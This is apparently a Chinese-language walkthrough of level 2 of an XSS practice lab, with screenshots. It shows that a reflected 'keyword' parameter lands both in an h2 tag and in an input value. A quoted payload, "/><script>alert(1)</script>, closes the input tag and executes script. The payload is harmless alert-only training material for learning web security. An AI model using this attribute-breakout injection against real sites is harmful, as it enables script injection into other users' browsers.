# level2

level2.php?keyword=test

可以看出，参数keyword的值，在页面有两处显示的地方

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157200294-96877534-6b4f-4d0d-9572-cd1c8048dcd2.png)

查看页面源码，一处在h2标签的文本内容中，一处在input标签的value中

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157333969-44923d13-6fe3-4a1a-b35d-4b0da78d5271.png)

level2.php?keyword=<script>alert(1)</script>

直接内容显示没有效果

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157462563-d5e97d05-c067-4566-a23b-64716ae72103.png)

level2.php?keyword="/><script>alert(1)</script>

闭合input标签，然后再执行js代码

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157531847-e99a38d1-34ad-4936-ab64-996c7e1f570e.png)